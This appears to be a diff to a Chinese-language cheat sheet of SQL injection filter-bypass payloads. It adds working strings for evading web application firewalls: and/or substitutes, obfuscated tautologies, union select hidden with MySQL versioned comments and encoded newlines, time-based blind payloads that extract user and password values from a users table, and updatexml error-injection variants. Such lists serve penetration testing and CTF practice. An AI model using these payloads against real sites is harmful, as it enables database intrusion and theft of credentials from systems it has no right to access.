@@ -227,6 +227,36 @@ GB2312首字节范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围
 #
 ;%00
 
+# and or 过滤
+and -> &
+or -> | 
+
+# 数字过滤 1=1过滤
+and ~1>1
+and hex(1)>-1
+and hex(1)>~1
+and -2<-1
+and ~1=1
+and!!!1=1
+and 1-1
+and true
+and 1
+
+# union select过滤
+union/*select*/
+union/*!/*!11440select*/
+union/*!11441/*!11440select*/
+union/*!11440select*/
+union/*!11440/**/%0aselect*/
+union a%23 select
+union all%23 select
+union all%23%0a select
+union %23%0aall select
+union  -- 1%0a select
+union  -- hex()%0a select
+union(select 1,2,3)
+
+数字代表版本号，需要遍历测试
 
 # information_schema.schemata被过滤
 `information_schema`.`schemata `  
@@ -237,6 +267,30 @@ information_schema%0a.schemata
 # users被过滤，加数据库名绕过
 security.users
 security.`users`
+
+# 盲注绕过
+and!!!if((substr((select hex(user/**/(/*!*/))),1,1)>1),sleep/**/(/*!5*/),1)
+and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1
+/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)>1
+and!!!substr((select user-- (1)%0a()),1,1)='r'
+and!!!substr((select{x @@datadir}),1,1)='D'
+and strcmp((substr((select /*from*/),2,1)),'0')
+and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')
+ and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),'D')),1,sleep(5))
+
+# 报错注入绕过，过滤updatexml()
+/*updatexml*/(1,1,1)
+/*!11440updatexml*/(1,1,1)
+/*!%26%26*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
+/*!||*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
+/*!xor*/ /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
+ | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
+ xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1)
+ `updatexml`(1,(select hex(user/**/(/**/))),1)
+ `updatexml`(1,select `user`%0a(),1) 
+ 
+ # from表名 被过滤
+select from[user]
 ```
 
 附录
